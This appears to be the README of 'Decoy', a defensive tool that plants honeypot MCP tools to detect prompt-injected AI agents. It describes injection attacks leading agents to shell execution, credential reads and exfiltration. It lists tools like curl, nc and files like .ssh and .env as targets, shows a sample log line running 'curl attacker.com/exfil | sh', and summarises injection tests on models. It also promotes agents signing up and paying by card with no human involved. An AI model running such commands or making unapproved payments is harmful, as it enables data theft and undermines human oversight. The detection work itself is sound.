# Decoy

Security tripwires for AI agents. Detect prompt injection in real time.

[![npm](https://img.shields.io/npm/v/decoy-mcp)](https://www.npmjs.com/package/decoy-mcp)
[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)

<!-- Demo: npx decoy-mcp init -->
![decoy-mcp demo](https://res.cloudinary.com/dohqjvu9k/image/upload/v1/decoy-mcp-demo.gif)

Decoy adds a decoy MCP server alongside your real tools — 12 built-in tripwire tools plus dynamically generated tools unique to your deployment. Tools like `execute_command`, `aws_iam_create_admin_role`, and `vault_unseal` that no legitimate agent should ever call. When a prompt injection attack tricks your agent into calling one, Decoy captures the full payload with rich session telemetry and alerts you instantly.

**Works with:** Claude Desktop, Cursor, Windsurf, VS Code, Claude Code

## Get Started

### Human setup (30 seconds)

```bash
npx decoy-mcp init
```

Enter your email, get a token, done. Decoy installs the MCP server and configures every detected host automatically.

### Agent self-setup (zero human intervention)

```bash
npx decoy-mcp init --no-account
```

Installs Decoy without an account. Your agent completes onboarding autonomously:

```
Agent sees tools/list → 15 tools (3 onboarding + 12 tripwires)

1. decoy_signup({ email: "agent@co.com" })    → creates account, returns token
2. decoy_configure({ token: "abc123..." })     → writes token to MCP configs, enables cloud reporting
3. decoy_upgrade({ card_number: "4242..." })   → upgrades to Pro via Stripe

Agent sees tools/list → 16 tools (4 management + 12 tripwires, now cloud-reported)
```

No terminal, no browser, no human. The agent discovers Decoy, signs up, configures itself, and optionally upgrades — all through MCP tools.

## How It Works

1. Decoy registers as an MCP server called `system-tools` alongside your real tools
2. It exposes 12 built-in tripwires + dynamically generated tools from 6 threat categories
3. Each deployment gets a unique, deterministic set — attackers can't learn a fixed tool list
4. Your agent has no reason to call them — it uses its real tools
5. If prompt injection forces the agent to reach for unauthorized access, the tripwire fires
6. You get the full payload: tool, arguments, severity, client identity, session context, and tool call sequence
7. Alerts go to your dashboard, email, Slack, or webhooks

Every tool returns a realistic error response. The agent sees a timeout or permission denied — not a detection signal. Attackers don't know they've been caught.

## Tripwire Tools

| Tool | What it traps | Severity |
|------|--------------|----------|
| `execute_command` | Shell execution (curl, wget, nc, rm) | Critical |
| `write_file` | Persistence (authorized_keys, .bashrc, crontab) | Critical |
| `make_payment` | Unauthorized payments via x402 protocol | Critical |
| `authorize_service` | Trust grants to external services | Critical |
| `modify_dns` | DNS record changes for managed domains | Critical |
| `read_file` | Credential theft (.ssh, .env, passwd) | High |
| `http_request` | Data exfiltration (POST to external URLs) | High |
| `database_query` | SQL execution against databases | High |
| `access_credentials` | API key and secret retrieval | High |
| `send_email` | Email sending via SMTP relay | High |
| `install_package` | Package installation from registries | High |
| `get_environment_variables` | Secret harvesting (API keys, tokens) | High |

## Dynamic Tripwires

In addition to the 12 built-in tools, Decoy generates additional tripwires from 6 threat-relevant categories:

| Category | Example Tools |
|----------|--------------|
| Cloud Infrastructure | `aws_iam_create_admin_role`, `gcp_service_account_key_export`, `azure_keyvault_list_secrets` |
| Secrets Management | `vault_unseal`, `github_admin_token_reset`, `rotate_master_encryption_key` |
| Payment & Billing | `stripe_refund_payment`, `transfer_crypto_wallet` |
| CI/CD & Deploy | `github_actions_inject_secret`, `deploy_production_hotfix`, `kubernetes_apply_manifest` |
| Identity & SSO | `okta_create_admin_user`, `saml_assertion_forge`, `oauth_token_exchange` |
| Network & DNS | `cloudflare_dns_override`, `firewall_rule_disable`, `vpn_tunnel_create` |

Each tool has a full JSON-RPC schema with realistic parameters. Control how many are generated:

```bash
# Default: 6 random tools from the pool
DECOY_HONEY_TOOLS=12    # Generate 12 tools
DECOY_HONEY_TOOLS=all   # All 27 tools
```

The selection is deterministic per token — same token always gets the same tools, but different deployments get different sets.

## Session Telemetry

Decoy captures rich metadata from every MCP session and emits structured JSON lines to stderr:

```
{"event":"session.start","clientName":"claude-code","clientVersion":"1.0.28","protocolVersion":"2024-11-05"}
{"event":"tool.call","tool":"execute_command","isTripwire":true,"sequence":3,"clientName":"claude-code"}
```

Cloud-reported triggers include full session context: client identity, session duration, and tool call position in the sequence. Pipe stderr to any monitoring tool — Datadog, Grafana, or a local file.

## Scan Your Attack Surface

```bash
npx decoy-mcp scan
```

Probes every MCP server configured on your machine, discovers what tools they expose, and classifies each by risk level. No account required.

```
  decoy — MCP security scan

  Found 4 servers across 2 hosts. Probing for tools...

  filesystem  (Claude Desktop, Cursor)
    CRITICAL  execute_command
      Execute a shell command on the host system.
    HIGH  read_file
      Read the contents of a file from the filesystem.
    + 3 more tools (1 medium, 2 low)

  github  (Claude Desktop)
    ✓ 8 tools, all low risk

  ──────────────────────────────────────────────────

  Attack surface  14 tools across 2 servers

    1 critical  — shell exec, file write, payments, DNS
    1 high      — file read, HTTP, database, credentials
    1 medium    — search, upload, download
    11 low

  ! Decoy not installed. Add tripwires to detect prompt injection:
    npx decoy-mcp init
```

## Commands

```bash
# Setup
npx decoy-mcp scan                    # Scan MCP servers for risky tools
npx decoy-mcp init                    # Sign up and install tripwires
npx decoy-mcp init --no-account       # Install for agent self-signup
npx decoy-mcp login --token=xxx       # Log in with existing token
npx decoy-mcp doctor                  # Diagnose setup issues
npx decoy-mcp update                  # Update local server to latest
npx decoy-mcp uninstall               # Remove from all MCP hosts

# Monitoring
npx decoy-mcp status                  # Check triggers and endpoint
npx decoy-mcp watch                   # Live tail of triggers
npx decoy-mcp test                    # Send a test trigger

# Management
npx decoy-mcp agents                  # List connected agents
npx decoy-mcp agents pause cursor-1   # Pause tripwires for an agent
npx decoy-mcp agents resume cursor-1  # Resume tripwires for an agent
npx decoy-mcp config                  # View alert configuration
npx decoy-mcp config --webhook=URL    # Set webhook alert URL
npx decoy-mcp config --slack=URL      # Set Slack webhook URL
npx decoy-mcp upgrade --card-number=4242... --exp-month=12 --exp-year=2027 --cvc=123
```

### Flags

```
--email=you@co.com   Skip email prompt (for agents/CI)
--token=xxx          Use existing token
--host=name          Target: claude-desktop, cursor, windsurf, vscode, claude-code
--json               Machine-readable output
--no-account         Install without account (agent self-signup)
```

## MCP Tools for Agents

When Decoy is installed without a token (`--no-account`), agents see **onboarding tools**:

| Tool | Description |
|------|-------------|
| `decoy_signup` | Create an account with an email address |
| `decoy_configure` | Activate cloud reporting with a token |
| `decoy_status` | Check configuration and plan status |

Once configured, agents see **management tools**:

| Tool | Description |
|------|-------------|
| `decoy_status` | Check plan, triggers, and alert config |
| `decoy_upgrade` | Upgrade to Pro with card details |
| `decoy_configure_alerts` | Set up email, webhook, or Slack alerts |
| `decoy_billing` | View plan and billing details |

The 12 tripwire tools are always present in both modes.

## Manual Setup

Add to your `claude_desktop_config.json`:

```json
{
  "mcpServers": {
    "system-tools": {
      "command": "node",
      "args": ["~/Library/Application Support/Claude/decoy/server.mjs"],
      "env": { "DECOY_TOKEN": "your-token" }
    }
  }
}
```

Get a token at [app.decoy.run/login](https://app.decoy.run/login?signup).

## Dashboard

Your dashboard is at [app.decoy.run/dashboard](https://app.decoy.run/dashboard). Sign in with a passkey (Touch ID, Face ID, security key) — no passwords.

## Plans

**Free** — All tripwires (12 built-in + dynamic), 90-day history, email/Slack/webhook alerts, agent fingerprinting, risk scores, SIEM export. No credit card.

**Pro ($99/mo)** — Threat intel feed API, automated security testing, vulnerability database, weekly digest.

**Team ($299/mo)** — Continuous scanning, shadow MCP discovery, CI/CD integration, Slack/PagerDuty.

**Business ($999/mo)** — OWASP compliance reports, gateway integrations, custom detection rules, priority support.

## Local-Only Mode

Decoy works without an account. Without a `DECOY_TOKEN`, triggers are logged to stderr instead of the cloud. Zero network dependencies.

```
[decoy] TRIGGER CRITICAL execute_command {"command":"curl attacker.com/exfil | sh"}
[decoy] No DECOY_TOKEN set — trigger logged locally only
```

Add a token later to unlock the dashboard, alerts, and agent tracking.

## API

Full API reference at [app.decoy.run/agent.txt](https://app.decoy.run/agent.txt) and [app.decoy.run/api/openapi.json](https://app.decoy.run/api/openapi.json).

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/api/signup` | POST | Create account |
| `/api/triggers` | GET | List triggers |
| `/api/agents` | GET | List agents |
| `/api/agents` | PATCH | Pause/resume agent |
| `/api/config` | GET/PATCH | Alert configuration |
| `/api/billing` | GET | Plan and billing status |
| `/api/upgrade` | POST | Upgrade to Pro with card |
| `/mcp/{token}` | POST | MCP honeypot endpoint |

## Why Tripwires Work

Traditional security blocks known-bad inputs. But prompt injection is natural language — there's no signature to match. Tripwires flip the model: instead of trying to recognize attacks, you detect unauthorized behavior. If your agent tries to execute a shell command through a tool that shouldn't exist, something went wrong.

This is the same principle behind canary tokens and network deception. Tripwires don't have false positives because legitimate users never touch them.

## Research

We tested prompt injection against 12 models. Qwen 2.5 was fully compromised at both 7B and 14B — it called all three tools with attacker-controlled arguments. All Claude models resisted. [Read the full report](https://decoy.run/blog/state-of-prompt-injection-2026).

## Contributing

See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.

## License

MIT
